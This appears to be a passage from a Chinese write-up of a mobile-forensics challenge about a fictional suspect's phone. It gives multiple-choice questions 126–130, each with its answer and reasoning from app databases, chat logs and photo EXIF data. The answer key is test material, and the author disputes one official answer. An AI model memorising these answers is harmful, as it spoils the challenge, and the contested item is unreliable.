+Milk Café (Fairview Park)
+在 App 列表中找到 foodpanda 的包名为
+com.global.foodpanda.android
+:
+在 App 的数据目录
+/data/com.global.foodpanda.android/databases/
+中找到关于购物车和订单的数据库, 分别为
+cart-db
+和
+order-db
+. 其中各有 1 条记录.
+购物车信息:
+订单信息:
+126 Alice 于 2024 年 8 月 30 日使用"Foodpanda"时的具体付款方式是?
+¶
+选项
+A. 微信支付
+B. PayMe
+C. 支付宝
+D. 现金
+E. 信用卡
+答案
+B
+接上题. 在购物车数据库中, 可以看到详细订单的付款方式:
+Alice 使用了 HSBC(汇丰银行)的 PayMe 支付.
+127 Alice 最后一次使用"Foodpanda"的日期是?
+¶
+答案
+2024-08-30
+本题存疑. 官方给出的答案是 2024-09-02.
+这道题本身来说没有什么难度, 但暴露了出题时的不严谨. 因此导致这道提的答案无法确定.
+在
+pandora.db.perseus
+中可以看到用户信息及获取信息的时间戳:
+最后的信息获取自
+1725009148861
+, 转化为标准时间是
+Fri Aug 30 17:12:28 2024
+. 说明用户在联网情况下最后一次启动 foodpanda 并从服务器获取了信息是
+2024-08-30
+. 可以说这是 Alice 最后一次运行了 foodpanda.
+但是, 数据库的修改日期却是
+2024-09-02
+. 说明之后应用有在后台运行或者曾经启动, 应用访问了数据库, 但没有写入任何信息.
+联系一下镜像的创建时间
+2024-09-02 10:45
+, 如果是在现实中就可以解释为拿到 Alice 的手机后, 没有第一时间开启飞行模式, 而是在联网的情况下完成了镜像提取的工作.
+取证流程不合规
+WhatsApp 中接收到的群聊消息也可以做证明:
+128 Alice 指示"客服人员"逃往哪里?
+¶
+选项
+A. 埃及
+B. 阿根廷
+C. 巴西
+D. 哥伦比亚
+E. 南非
+答案
+E
+在 Line 的聊天记录中可以看到 Alice 和 Boat 的聊天记录:
+说是坐快艇去南非.
+在 WhatsApp 的群聊中可以看到 Alice 给客服下指示:
+129 Alice 发送给"客服人员"的上船地点照片的具体 GPS 坐标是?
+¶
+选项
+A. 22.474444444444, 114.039722222222
+B. 22.473611111111, 114.042777777778
+C. 22.475277777778, 114.038888888889
+D. 22.475000000007, 114.035833333333
+E. 22.476388888889, 114.036388888889
+答案
+A
+找到相册中的原图, 查看图片的 EXIF 信息:
+130 2024 年 8 月 16 日 Alice 进行拍摄活动的确切地点是?
+¶
+选项
+A. 旺角
+B. 沙田
+C. 黄大仙
+D. 大生围
+E. 天水围
+答案
+D
+根据图片的 EXIF 信息中的位置信息, 当天大多数照片在大生围附近拍摄:
+剧情
+¶
+凭着你及团队的机智及专业知识, 成功锁定犯罪团伙禁锢人质的位置. 
+行动单位根据你的讯息, 迅速展开拯救行动, 赶在被押离港前成功救出人质.
